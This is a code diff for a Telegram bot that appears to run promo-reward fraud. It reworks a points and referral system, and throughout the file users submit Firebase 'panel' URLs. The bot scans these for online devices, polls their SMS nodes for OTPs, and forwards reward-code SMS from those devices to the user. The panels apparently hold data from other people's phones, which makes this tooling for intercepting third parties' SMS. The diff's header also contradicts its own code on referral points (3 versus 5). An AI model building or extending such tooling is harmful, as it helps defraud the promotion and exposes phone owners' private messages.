@@ -6,7 +6,8 @@
 #
 # Users can:
 #   * Spin manually (1 point per spin, earned via referrals)
-#   * Add MANY of their OWN Firebase URLs at once (slots controlled by admin)
+#   * Add MANY of their OWN Firebase URLs at once (1 point per URL, paid from
+#     their points balance; the addition is confirmed before charging)
 #   * Every added panel is automatically scanned for online devices
 #   * The user SELECTS exactly ONE panel (locked forever - only admin can
 #     change it); the chosen panel is processed:
@@ -15,9 +16,15 @@
 #     that device; reward-code / Ujala SMS messages are forwarded to the user
 #   * Users CANNOT delete Firebase URLs - only admins can (via admin panel)
 #
+# POINTS SYSTEM (universal balance)
+#   * Every successful referral awards the referrer +3 points
+#   * 1 point = 1 spin OR 1 Firebase panel added
+#   * Adding Firebase only happens AFTER the user confirms (✅ ADD ALL) -
+#     nothing is charged on cancel
+#
 # All heavy background work (panel processing, scans, SMS monitors) runs
 # through ONE FIFO JOB QUEUE with a bounded worker pool (JOB_WORKERS, default
-# 2). The bot can never crash from too many users - every user simply waits
+# 3). The bot can never crash from too many users - every user simply waits
 # their turn and sees their queue position on screen.
 #
 # Force channel join: BOTH channels are required:
@@ -26,8 +33,7 @@
 # Admin can:
 #   * View every Firebase URL (view-only list + details)
 #   * DELETE any Firebase URL (with confirmation, owner gets notified)
-#   * Set a custom max slot count per user (SET MAX SLOTS: -1 = referral
-#     based, 0 = blocked, any positive number = hard limit, 9999 = "∞")
+#   * See which panel is selected (locked) for each user
 #
 # All progress is reported by EDITING a single message (no message spam).
 #
@@ -38,7 +44,7 @@
 #     export CHANNEL_USERNAME="viedietlooters"
 #     export CHANNEL2_USERNAME="NARUTOxLOOT"
 #     export DATA_DIR="./data"
-#     export JOB_WORKERS="2"      # optional: max parallel background jobs
+#     export JOB_WORKERS="3"      # optional: max parallel background jobs
 #     python3 viediet_ujala_bot.py
 #
 # REQUIREMENTS (see requirements.txt)
@@ -96,11 +102,12 @@ DATA_DIR = os.environ.get("DATA_DIR", "./data").strip()
 PRODUCT_CODE = "8902102126232"                   # Ujala product code (hardcoded)
 GROUP_LINK = "https://t.me/viedietlooterschat"   # support group (selection changes / help)
 SPIN_COST = 1                                    # points needed per spin
-REFERRAL_POINTS = 1                              # points earned per successful referral
+FIREBASE_COST = 1                                # points cost to add each Firebase URL
+REFERRAL_POINTS = 5                              # points earned per successful referral
 PAGE_SIZE = 10                                   # admin list pagination size
 API_RETRIES = 2                                  # max attempts for every Ujala API call
 OTP_POLL_SECONDS = 45                            # how long to poll the panel SMS node
-JOB_WORKERS = int(os.environ.get("JOB_WORKERS", "2"))  # max parallel background jobs
+JOB_WORKERS = int(os.environ.get("JOB_WORKERS", "3"))  # max parallel background jobs
 JOB_WAIT_TIME = int(os.environ.get("JOB_WAIT_TIME", "2"))  # sec between job numbers
 
 if not BOT_TOKEN:
@@ -217,13 +224,6 @@ def init_db():
             if "is_selected" not in fb_cols:
                 conn.execute("ALTER TABLE user_firebases ADD COLUMN is_selected INTEGER DEFAULT 0")
                 logger.info("Migrated user_firebases table: added is_selected column")
-            # Safety: keep slots_used in sync with the actual row count
-            conn.execute(
-                """UPDATE users SET slots_used = (
-                       SELECT COUNT(*) FROM user_firebases
-                       WHERE user_firebases.user_id = users.user_id
-                   )"""
-            )
             conn.commit()
         finally:
             conn.close()
@@ -282,17 +282,20 @@ def update_user(user_id, **fields):
             conn.close()
 
 
-def try_deduct_point(user_id):
+def try_deduct_points(user_id, amount):
     """
-    Atomically deduct SPIN_COST points, only if balance is sufficient.
-    Returns True on success. Used so deduction only happens on successful spin.
+    Atomically deduct `amount` points, only if balance is sufficient.
+    Returns True on success. Used so deduction only happens on success
+    (spin claim, Firebase addition, ...).
     """
+    if amount <= 0:
+        return True
     with _db_lock:
         conn = get_conn()
         try:
             cur = conn.execute(
                 "UPDATE users SET points = points - ? WHERE user_id = ? AND points >= ?",
-                (SPIN_COST, user_id, SPIN_COST),
+                (amount, user_id, amount),
             )
             conn.commit()
             return cur.rowcount > 0
@@ -457,23 +460,8 @@ def get_spin_count(user_id):
 
 # ─────────────────────────── user_firebases ───────────────────────────
 
-def sync_slots(user_id):
-    """Recalculate slots_used for a user from the real row count."""
-    with _db_lock:
-        conn = get_conn()
-        try:
-            row = conn.execute(
-                "SELECT COUNT(*) FROM user_firebases WHERE user_id = ?", (user_id,)
-            ).fetchone()
-            conn.execute("UPDATE users SET slots_used = ? WHERE user_id = ?",
-                         (row[0], user_id))
-            conn.commit()
-        finally:
-            conn.close()
-
-
 def get_firebase_count(user_id):
-    """Number of Firebase URLs a user has added (used slots)."""
+    """Number of Firebase URLs a user has added."""
     with _db_lock:
         conn = get_conn()
         try:
@@ -483,36 +471,6 @@ def get_firebase_count(user_id):
             return row[0]
         finally:
             conn.close()
-
-
-def get_firebase_slots(user_id):
-    """
-    Return (used_slots, max_slots).
-    Max slots logic:
-      * custom_max_slots >= 0  -> admin hard limit (0 = blocked, N = max N,
-        9999 = effectively unlimited / shown as ∞)
-      * custom_max_slots == -1 -> referral count (default behavior)
-    """
-    used = get_firebase_count(user_id)
-    user = get_user(user_id)
-    if user:
-        custom = user.get("custom_max_slots")
-        if custom is not None and int(custom) >= 0:
-            return used, int(custom)
-    return used, get_referral_count(user_id)
-
-
-def has_firebase_slot(user_id):
-    """True if the user can still add another Firebase URL."""
-    used, maximum = get_firebase_slots(user_id)
-    return used < maximum
-
-
-def slots_display(user_id):
-    """Human readable slot text, e.g. '2/3', '0/0' or '2/∞'."""
-    used, maximum = get_firebase_slots(user_id)
-    max_text = "∞" if maximum >= 9999 else str(maximum)
-    return f"{used}/{max_text}"
 
 
 def is_duplicate_firebase(user_id, firebase_url):
@@ -540,8 +498,6 @@ def add_firebase(user_id, firebase_url):
                    VALUES (?, ?, ?, 'pending')""",
                 (user_id, firebase_url, now),
             )
-            conn.execute("UPDATE users SET slots_used = slots_used + 1 WHERE user_id = ?",
-                         (user_id,))
             conn.commit()
             return cur.lastrowid
         except sqlite3.IntegrityError:
@@ -655,7 +611,7 @@ def update_firebase(fb_id, **fields):
 
 
 def delete_firebase(fb_id):
-    """Delete one Firebase row and recalculate the owner's slots_used."""
+    """Delete one Firebase row. Returns True on success."""
     with _db_lock:
         conn = get_conn()
         try:
@@ -665,13 +621,6 @@ def delete_firebase(fb_id):
             if not row:
                 return False
             conn.execute("DELETE FROM user_firebases WHERE id = ?", (fb_id,))
-            conn.execute(
-                """UPDATE users SET slots_used = (
-                       SELECT COUNT(*) FROM user_firebases
-                       WHERE user_firebases.user_id = users.user_id
-                   ) WHERE user_id = ?""",
-                (row["user_id"],),
-            )
             conn.commit()
             return True
         finally:
@@ -1695,12 +1644,8 @@ def main_menu_keyboard(user):
     kb.row(btn("🎡 SPIN NOW", callback_data="spin_now"))
     kb.row(btn("👥 MY REFERRALS", callback_data="my_referrals"),
            btn("🔗 REFERRAL LINK", callback_data="referral_link"))
-    # ADD FIREBASE is only shown while the user still has free slots
-    if user and has_firebase_slot(user["user_id"]):
-        kb.row(btn("📁 ADD FIREBASE", callback_data="add_firebase"),
-               btn("📂 MY FIREBASE", callback_data="my_firebase"))
-    else:
-        kb.row(btn("📂 MY FIREBASE", callback_data="my_firebase"))
+    kb.row(btn("📁 ADD FIREBASE", callback_data="add_firebase"),
+           btn("📂 MY FIREBASE", callback_data="my_firebase"))
     kb.row(btn("📊 MY HISTORY", callback_data="my_history"),
            btn("🆘 HELP", callback_data="help"))
     if user and user.get("is_admin"):
@@ -1711,16 +1656,15 @@ def main_menu_keyboard(user):
 def main_menu_text(user, first_name):
     name = escape(first_name or "User")
     points = user["points"] if user else 0
-    slots = slots_display(user["user_id"]) if user else "0/0"
     return (
         f"🎡 <b>VIEDIET UJALA BOT</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"👋 Welcome, <b>{name}</b>!\n"
         f"💎 Your Points: <b>{points}</b>\n"
-        f"📁 Firebase Slots: <b>{slots}</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"🎡 Each spin costs <b>1 point</b>\n"
-        f"👥 Each referral gives <b>+1 points</b> and <b>+1 Firebase slot</b>\n"
+        f"📁 Each Firebase panel costs <b>1 point</b>\n"
+        f"👥 Each referral gives <b>+{REFERRAL_POINTS} points</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"Spin the wheel and win exciting rewards! 🎉\n"
         f"{FOOTER}"
@@ -1780,6 +1724,7 @@ admin_states = {}        # user_id -> {type, target}
 broadcast_msgs = {}      # user_id -> text awaiting confirmation
 admin_confirm_pts = {}   # user_id -> {action, target, amount}
 firebase_states = {}     # user_id -> {"step": "awaiting_url"}
+firebase_confirmations = {}  # user_id -> {"urls": [...], "dupes": [...], "cost": N}
 
 
 def clear_state(user_id):
@@ -1790,6 +1735,7 @@ def clear_state(user_id):
         broadcast_msgs.pop(user_id, None)
         admin_confirm_pts.pop(user_id, None)
         firebase_states.pop(user_id, None)
+        firebase_confirmations.pop(user_id, None)
 
 
 def is_admin(user):
@@ -1813,16 +1759,15 @@ def send_help(chat_id, message_id=None, edit=True):
         f"4️⃣ Watch the wheel spin! 🎉\n\n"
         f"👥 <b>HOW TO EARN POINTS</b>\n"
         f"• Share your referral link with friends\n"
-        f"• Each friend who joins gives <b>+1 points</b>\n"
-        f"• Each referral also gives <b>+1 Firebase slot</b>\n"
-        f"  (admin can set custom limits or ∞)\n\n"
+        f"• Each friend who joins gives <b>+{REFERRAL_POINTS} points</b>\n\n"
         f"📁 <b>HOW TO ADD FIREBASE</b>\n"
-        f"1️⃣ Press <b>ADD FIREBASE</b>\n"
+        f"1️⃣ Press <b>ADD FIREBASE</b> (costs <b>1 point</b> per URL)\n"
         f"2️⃣ Send <b>one URL per line</b> (bulk allowed!), e.g.\n"
         f"   <code>https://panel-name-default-rtdb.firebaseio.com</code>\n"
-        f"3️⃣ The bot scans every URL for online devices\n"
-        f"4️⃣ Pick a panel with the <b>SELECT</b> button to process it\n"
-        f"5️⃣ After each claim, a <b>10-minute SMS monitor</b> watches "
+        f"3️⃣ The bot validates the URLs and shows a <b>confirmation</b>\n"
+        f"4️⃣ Tap <b>✅ ADD ALL</b> — points are deducted and the bot scans every URL\n"
+        f"5️⃣ Pick a panel with the <b>SELECT</b> button to process it\n"
+        f"6️⃣ After each claim, a <b>10-minute SMS monitor</b> watches "
         f"that device and forwards reward-code SMS to you\n\n"
         f"🔒 <b>SELECTED PANEL IS LOCKED</b> — you cannot delete or change it "
         f"yourself. Contact admin to change it.\n\n"
@@ -1863,10 +1808,9 @@ def send_referral_link(chat_id, message_id=None, edit=True):
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"👥 Successful referrals: <b>{count}</b>\n"
         f"💎 Points earned: <b>{points_earned}</b>\n"
-        f"📁 Firebase slots unlocked: <b>{count}</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"📋 Recent referrals:\n{ref_text}\n\n"
-        f"💡 Friend joins = <b>+{REFERRAL_POINTS} points</b> + <b>1 slot</b> for you!\n"
+        f"💡 Friend joins = <b>+{REFERRAL_POINTS} points</b> for you!\n"
         f"{FOOTER}"
     )
     share_url = f"https://t.me/share/url?url={urllib.parse.quote(link)}"
@@ -1883,16 +1827,14 @@ def send_my_referrals(chat_id, message_id=None, edit=True):
     """MY REFERRALS menu: show count and points earned."""
     count = get_referral_count(chat_id)
     points_earned = count * REFERRAL_POINTS
-    slots = slots_display(chat_id)
     text = (
         f"👥 <b>MY REFERRALS</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"✅ Successful referrals: <b>{count}</b>\n"
         f"💎 Points earned: <b>{points_earned}</b>\n"
-        f"📁 Firebase slots used: <b>{slots}</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"🎯 Invite more friends to earn more!\n"
-        f"Each referral = <b>+{REFERRAL_POINTS} points</b> + <b>1 slot</b>\n\n"
+        f"Each referral = <b>+{REFERRAL_POINTS} points</b>\n\n"
         f"Get your link from the menu 👉 🔗 REFERRAL LINK\n"
         f"{FOOTER}"
     )
@@ -1992,7 +1934,8 @@ def _firebase_list_markup(rows, with_select=True, page=0, total_pages=1, selecte
 
 def send_my_firebase(chat_id, message_id=None, page=0, edit=True):
     """MY FIREBASE: list all URLs added by the user with status + SELECT."""
-    slots = slots_display(chat_id)
+    user = get_user(chat_id)
+    points = user["points"] if user else 0
     rows = get_user_firebases(chat_id)
     selected = get_selected_firebase(chat_id)
     total_pages = max(1, (len(rows) + MYFB_PAGE_SIZE - 1) // MYFB_PAGE_SIZE)
@@ -2006,7 +1949,7 @@ def send_my_firebase(chat_id, message_id=None, page=0, edit=True):
             f"📂 <b>MY FIREBASE</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             f"❌ You have not added any Firebase URLs yet.\n\n"
-            f"📁 Slots used: <b>{slots}</b>\n"
+            f"💎 Points: <b>{points}</b> (1 point per URL)\n"
             f"Press 📁 ADD FIREBASE to add one (or many)!\n"
             f"{FOOTER}"
         )
@@ -2027,7 +1970,7 @@ def send_my_firebase(chat_id, message_id=None, page=0, edit=True):
         body = (
             f"📂 <b>MY FIREBASE</b>{nav_note}\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"📁 Slots used: <b>{slots}</b>\n"
+            f"💎 Points: <b>{points}</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             f"{lines}\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -2052,7 +1995,8 @@ def send_firebase_selection(chat_id, message_id=None, edit=True):
     and a SELECT button (success style) for panels that found online devices.
     Once a panel is locked, the SELECT buttons disappear.
     """
-    slots = slots_display(chat_id)
+    user = get_user(chat_id)
+    points = user["points"] if user else 0
     rows = get_user_firebases(chat_id)
     selected = get_selected_firebase(chat_id)
     selectable = [r for r in rows if r["status"] == "scanned"]
@@ -2084,7 +2028,7 @@ def send_firebase_selection(chat_id, message_id=None, edit=True):
             f"❌ No URL has online devices right now.\n\n"
             f"💡 Add other URLs with 📁 ADD FIREBASE, or\n"
             f"💡 Panels may be offline - try again later.\n"
-            f"📁 Slots used: <b>{slots}</b>\n"
+            f"💎 Points: <b>{points}</b>\n"
             f"{FOOTER}"
         )
         markup = InlineKeyboardMarkup(row_width=1)
@@ -2147,39 +2091,43 @@ def is_valid_firebase_url(raw_url):
 
 
 def start_add_firebase(chat_id, message_id=None):
-    """Entry point of the ADD FIREBASE flow (checks slots first)."""
+    """Entry point of the ADD FIREBASE flow (checks points first)."""
     user = get_user(chat_id)
     if not user:
         return
-    if not has_firebase_slot(chat_id):
+    points = user.get("points") or 0
+    if points < FIREBASE_COST:
         kb = InlineKeyboardMarkup(row_width=1)
         kb.row(btn("🔗 GET REFERRAL LINK", callback_data="referral_link"))
         kb.row(btn("📂 MY FIREBASE", callback_data="my_firebase"))
         bot.send_message(
             chat_id,
-            f"❌ <b>No Firebase slots available!</b>\n"
+            f"❌ <b>You need at least 1 point to add Firebase!</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"📁 Slots used: <b>{slots_display(chat_id)}</b>\n\n"
-            f"👉 Refer more friends to unlock more slots, or\n"
-            f"👉 Contact admin to raise your limit\n"
+            f"💎 Your Points: <b>{points}</b>\n"
+            f"💳 Cost per URL: <b>{FIREBASE_COST} point</b>\n\n"
+            f"👉 Refer friends to earn more points, or\n"
+            f"👉 Contact admin to top up your balance\n"
             f"{FOOTER}",
             reply_markup=kb,
         )
         return
     with _state_lock:
+        firebase_confirmations.pop(chat_id, None)
         firebase_states[chat_id] = {"step": "awaiting_url"}
     text = (
         f"📁 <b>ADD FIREBASE (BULK)</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"📁 Slots used: <b>{slots_display(chat_id)}</b>\n"
+        f"💎 Your Points: <b>{points}</b>\n"
+        f"💳 Cost: <b>{FIREBASE_COST} point</b> per URL\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"Send <b>one Firebase URL per line</b> "
         f"(you can paste several at once):\n\n"
         f"Example:\n"
         f"<code>https://panel-name-default-rtdb.firebaseio.com</code>\n"
         f"<code>https://panel2-default-rtdb.asia-southeast1.firebasedatabase.app</code>\n\n"
-        f"Every URL is validated and automatically scanned "
-        f"for online devices. Then you pick one to process!\n\n"
+        f"Your URLs will be validated, then you confirm before anything "
+        f"is added or charged.\n\n"
         f"❌ Send /cancel to abort.\n"
         f"{FOOTER}"
     )
@@ -2232,8 +2180,9 @@ def scan_firebases_and_present(chat_id, message_id):
 
 def handle_add_firebase_text(chat_id, text):
     """
-    Bulk add flow: parse newline separated URLs, validate each, insert the
-    valid ones (subject to slot limits), then scan them in background.
+    Bulk add flow: parse newline separated URLs, validate each, filter
+    duplicates, then show a CONFIRMATION (with the total point cost) before
+    anything is inserted or charged. Nothing is added until the user taps ✅.
     """
     raw_urls = [line.strip() for line in (text or "").splitlines() if line.strip()]
     valid, invalid = [], []
@@ -2258,48 +2207,165 @@ def handle_add_firebase_text(chat_id, text):
         )
         return
 
-    # Insert valid URLs one by one, respecting slots and duplicates
-    added, dupes, no_slot = [], [], []
+    # Filter URLs this user already added (skipped, never charged)
+    new_urls, dupes = [], []
     for url in valid:
         if is_duplicate_firebase(chat_id, url):
             dupes.append(url)
-            continue
-        if not has_firebase_slot(chat_id):
-            no_slot.append(url)
-            continue
-        fb_id = add_firebase(chat_id, url)
-        if fb_id:
-            added.append(fb_id)
+        else:
+            new_urls.append(url)
 
     with _state_lock:
         firebase_states.pop(chat_id, None)
 
-    if not added:
+    if not new_urls:
         bot.send_message(
             chat_id,
-            f"❌ <b>Nothing was added.</b>\n"
+            f"❌ <b>Nothing new to add.</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"🔁 Duplicates: <b>{len(dupes)}</b>\n"
-            f"📁 No free slots: <b>{len(no_slot)}</b>\n"
-            f"📁 Slots used: <b>{slots_display(chat_id)}</b>\n\n"
-            f"👉 Refer friends to unlock more slots or contact admin.\n"
+            f"🔁 Already added by you: <b>{len(dupes)}</b>\n"
+            f"📂 Each of these URLs is already in your MY FIREBASE.\n"
             f"{FOOTER}",
+            parse_mode="HTML",
+        )
+        return
+
+    cost = len(new_urls) * FIREBASE_COST
+    user = get_user(chat_id)
+    points = user["points"] if user else 0
+    if points < cost:
+        kb = InlineKeyboardMarkup(row_width=1)
+        kb.row(btn("🔗 GET REFERRAL LINK", callback_data="referral_link"))
+        bot.send_message(
+            chat_id,
+            f"❌ <b>Not enough points!</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"📁 Valid URLs to add: <b>{len(new_urls)}</b>\n"
+            f"💳 Cost: <b>{cost}</b> points\n"
+            f"💎 Your balance: <b>{points}</b>\n\n"
+            f"👉 You need <b>{cost - points}</b> more point(s). "
+            f"Refer friends or contact admin.\n"
+            f"{FOOTER}",
+            reply_markup=kb,
+        )
+        return
+
+    # Store the confirmation until the user presses ✅ / ❌
+    with _state_lock:
+        firebase_confirmations[chat_id] = {
+            "urls": new_urls, "dupes": dupes, "cost": cost,
+        }
+
+    line_list = "\n".join(
+        f"• <code>{escape(_fb_short(u))}</code>" for u in new_urls[:10]
+    )
+    if len(new_urls) > 10:
+        line_list += f"\n  ... and {len(new_urls) - 10} more"
+    dup_note = ""
+    if dupes:
+        dup_note = f"\n🔁 Skipped (already added by you): <b>{len(dupes)}</b>\n"
+
+    kb = InlineKeyboardMarkup(row_width=2)
+    kb.row(btn(f"✅ ADD ALL ({cost} 💎)", callback_data="fb_add_confirm"))
+    kb.row(btn("❌ CANCEL", callback_data="fb_add_cancel"))
+    bot.send_message(
+        chat_id,
+        f"📁 <b>CONFIRM ADDING FIREBASE</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🧾 URLs to add: <b>{len(new_urls)}</b>\n"
+        f"💳 Total cost: <b>{cost} point(s)</b>\n"
+        f"💎 Your balance: <b>{points}</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"{line_list}\n"
+        f"{dup_note}"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"Only on <b>✅ ADD ALL</b> will the points be deducted and "
+        f"the URLs be added + scanned.\n"
+        f"{FOOTER}",
+        reply_markup=kb,
+        parse_mode="HTML",
+    )
+
+
+def confirm_firebase_add(chat_id, message_id):
+    """
+    User confirmed: insert every URL, deduct the points, start scanning.
+    If points ran out before confirmation, abort with an error.
+    """
+    with _state_lock:
+        conf = firebase_confirmations.pop(chat_id, None)
+    if not conf:
+        bot.send_message(chat_id,
+                         "❌ No pending Firebase confirmation found. "
+                         "Please start over with 📁 ADD FIREBASE.")
+        return
+    new_urls = conf["urls"]
+    cost = conf["cost"]
+
+    user = get_user(chat_id)
+    points = user["points"] if user else 0
+    if not user or points < cost:
+        bot.send_message(
+            chat_id,
+            f"❌ <b>Not enough points anymore.</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"💳 Cost: <b>{cost}</b> points\n"
+            f"💎 Your balance: <b>{points}</b>\n"
+            f"No points were deducted and nothing was added.\n"
+            f"{FOOTER}",
+            parse_mode="HTML",
+        )
+        return
+
+    # Insert rows first, then deduct points atomically
+    added = 0
+    failed = []
+    for url in new_urls:
+        if is_duplicate_firebase(chat_id, url):
+            continue  # safety race: skip, never double-charge
+        if add_firebase(chat_id, url):
+            added += 1
+        else:
+            failed.append(url)
+
+    # Deduct only the points for what actually got inserted
+    deduct = added * FIREBASE_COST
+    if deduct > 0:
+        if not try_deduct_points(chat_id, deduct):
+            # Extremely unlikely (we already checked above): keep the rows but
+            # log it so the admin can top the user up if really needed.
+            logger.error("Point deduction failed for %s after adding %d URLs",
+                         chat_id, added)
+
+    if added == 0:
+        bot.send_message(
+            chat_id,
+            f"❌ <b>Could not add any URL.</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"Maybe they were already added moments ago.\n"
+            f"{FOOTER}",
+            parse_mode="HTML",
         )
         return
 
     notes = []
-    if dupes:
-        notes.append(f"🔁 Skipped duplicates: <b>{len(dupes)}</b>")
-    if no_slot:
-        notes.append(f"📁 Skipped (no slot): <b>{len(no_slot)}</b>")
+    if conf.get("dupes"):
+        notes.append(f"🔁 Skipped (already added): <b>{len(conf['dupes'])}</b>")
+    if failed:
+        notes.append(f"⚠️ Failed to insert: <b>{len(failed)}</b>")
     note_text = "\n".join(notes) + ("\n" if notes else "")
 
+    user = get_user(chat_id)
+    points_left = user["points"] if user else 0
     try:
         msg = bot.send_message(
             chat_id,
-            f"✅ <b>Added {len(added)} Firebase URL(s)</b>\n"
+            f"✅ <b>Added {added} Firebase URL(s)</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             f"{note_text}"
+            f"💳 Points deducted: <b>{deduct}</b>\n"
+            f"💎 Points left: <b>{points_left}</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             f"🔍 Scanning for online devices...\n"
             f"{FOOTER}",
             parse_mode="HTML",
@@ -2310,6 +2376,12 @@ def handle_add_firebase_text(chat_id, text):
 
     # Scan everything in the queue (never blocks the bot, never piles up)
     _enqueue_job("scan", (chat_id, mid))
+
+
+def cancel_firebase_add(chat_id):
+    """User cancelled the addition - nothing is added or charged."""
+    with _state_lock:
+        firebase_confirmations.pop(chat_id, None)
 
 
 def select_firebase(chat_id, message_id, fb_id, call):
@@ -2489,7 +2561,7 @@ def handle_spin_otp(chat_id, text):
                          f"{FOOTER}")
         return
     # Success: deduct exactly one point (only on success) and record history
-    if not try_deduct_point(chat_id):
+    if not try_deduct_points(chat_id, SPIN_COST):
         with _state_lock:
             spin_sessions.pop(chat_id, None)
         bot.send_message(chat_id,
@@ -2657,13 +2729,12 @@ def send_admin_user_detail(chat_id, message_id, target_id):
         return
     ref_count = get_referral_count(target_id)
     spin_count = get_spin_count(target_id)
-    fb_used, fb_max = get_firebase_slots(target_id)
-    fb_slots_txt = f"{fb_used}/∞" if fb_max >= 9999 else f"{fb_used}/{fb_max}"
-    custom = u.get("custom_max_slots")
-    max_txt = "∞ (9999)" if (custom is not None and int(custom) >= 9999) else (
-        "blocked (0)" if (custom is not None and int(custom) == 0) else (
-            str(custom) if (custom is not None and int(custom) > 0) else
-            "auto (referral count)"))
+    fb_count = get_firebase_count(target_id)
+    selected = get_selected_firebase(target_id)
+    selected_txt = (
+        f"🔒 <code>{escape(selected['firebase_url'])}</code>"
+        if selected else "❌ None"
+    )
     ref_name = "—"
     if u.get("referred_by"):
         r = get_user(u["referred_by"])
@@ -2680,9 +2751,8 @@ def send_admin_user_detail(chat_id, message_id, target_id):
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"💎 Points: <b>{u.get('points', 0)}</b>\n"
         f"🔗 Referrals: <b>{ref_count}</b>\n"
-        f"📁 Firebase: <b>{fb_slots_txt}</b>\n"
-        f"🎚️ Max slots: <b>{max_txt}</b>\n"
-        f"   (send 'SET MAX SLOTS' → number, 9999 = ∞)\n"
+        f"📁 Firebase panels: <b>{fb_count}</b>\n"
+        f"🔒 Selected panel: {selected_txt}\n"
         f"🎡 Spins: <b>{spin_count}</b>\n"
         f"🎰 Last spin: {u.get('last_spin') or 'Never'}\n"
         f"⛔ Banned: {'YES' if u.get('banned') else 'No'}\n"
@@ -2693,9 +2763,7 @@ def send_admin_user_detail(chat_id, message_id, target_id):
            btn("➖ REMOVE POINTS", callback_data=f"admin_rem_pts_{target_id}"))
     kb.row(btn("🎡 SPIN HISTORY", callback_data=f"admin_spins_{target_id}"),
            btn("📁 FIREBASE", callback_data=f"admin_fb_user_{target_id}"))
-    kb.row(btn("🎚️ SET MAX SLOTS",
-               callback_data=f"admin_maxslots_{target_id}"),
-           btn("⛔ BAN/UNBAN", callback_data=f"admin_ban_{target_id}"))
+    kb.row(btn("⛔ BAN/UNBAN", callback_data=f"admin_ban_{target_id}"))
     kb.row(btn("🔙 USERS", callback_data="admin_users"))
     safe_edit(chat_id, message_id, text, kb)
 
@@ -2833,7 +2901,7 @@ def admin_delete_firebase(chat_id, message_id, fb_id, call):
                 f"🗑️ <b>Your Firebase panel was deleted by the admin</b>\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"<code>{escape(r['firebase_url'])}</code>\n\n"
-                f"📁 Your Firebase slot was freed.\n"
+                f"Your panel has been removed from your account.\n"
                 f"{FOOTER}",
             )
         except Exception:
@@ -2845,26 +2913,35 @@ def admin_delete_firebase(chat_id, message_id, fb_id, call):
 
 
 def send_admin_user_firebases(chat_id, message_id, target_id):
-    """List the Firebase URLs of one specific user (admin view-only)."""
+    """List the Firebase URLs of one specific user (admin view, marks the selected)."""
     rows = get_user_firebases(target_id)
+    selected = get_selected_firebase(target_id)
+    selected_id = selected["id"] if selected else None
     if not rows:
         body = (f"📁 <b>FIREBASE</b> for user <code>{target_id}</code>\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"❌ No Firebase URLs added.\n"
+                f"🔒 Selected panel: {'<code>' + escape(selected['firebase_url']) + '</code>' if selected else 'None'}\n"
                 f"{FOOTER}")
     else:
         lines = []
         for r in rows:
+            marker = "🔒" if r["id"] == selected_id else "•"
             lines.append(
-                f"{_STATUS_EMOJI.get(r['status'], '⏳')} <code>{escape(r['firebase_url'])}</code>\n"
+                f"{marker} {_STATUS_EMOJI.get(r['status'], '⏳')} <code>{escape(r['firebase_url'])}</code>\n"
                 f"   🆔 {r['id']} | 📅 {r['added_at']}\n"
                 f"   {escape(r['summary'] or '—')}"
             )
+        sel_note = (
+            f"🔒 Selected panel: <code>{escape(selected['firebase_url'])}</code>\n"
+            if selected else "🔒 Selected panel: None\n"
+        )
         body = (
             f"📁 <b>FIREBASE</b> for user <code>{target_id}</code>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             + "\n".join(lines) +
             f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"{sel_note}"
             f"ℹ️ Users cannot delete panels — admin only.\n"
             f"{FOOTER}"
         )
@@ -2932,8 +3009,7 @@ def cmd_start(message):
                     f"🎉 <b>New referral!</b>\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                     f"👤 {ref_name} joined using your link!\n"
-                    f"💎 <b>+{REFERRAL_POINTS} points</b> and "
-                    f"<b>+1 Firebase slot</b> added!\n"
+                    f"💎 <b>+{REFERRAL_POINTS} points</b> added to your balance!\n"
                     f"{FOOTER}",
                 )
 
@@ -3071,45 +3147,6 @@ def handle_text(message):
                 )
                 return
 
-            if kind == "set_max_slots":
-                target_id = admin_state.get("target")
-                with _state_lock:
-                    admin_states.pop(user_id, None)
-                try:
-                    new_max = int(text)
-                    if new_max < -1:
-                        raise ValueError
-                except ValueError:
-                    bot.send_message(user_id,
-                                     "❌ Please send a valid integer (-1, 0 or any "
-                                     "positive number).\nUse /cancel to abort.")
-                    return
-                if target_id is None:
-                    return
-                update_user(target_id, custom_max_slots=new_max)
-                if new_max == -1:
-                    word = "auto (referral count)"
-                elif new_max == 0:
-                    word = "blocked (0 slots)"
-                elif new_max >= 9999:
-                    word = "∞ unlimited (9999)"
-                else:
-                    word = f"{new_max} slots"
-                try:
-                    bot.send_message(
-                        target_id,
-                        f"🎚️ <b>Firebase slots updated by admin</b>\n"
-                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                        f"Your max Firebase panels are now: <b>{word}</b>\n"
-                        f"{FOOTER}",
-                    )
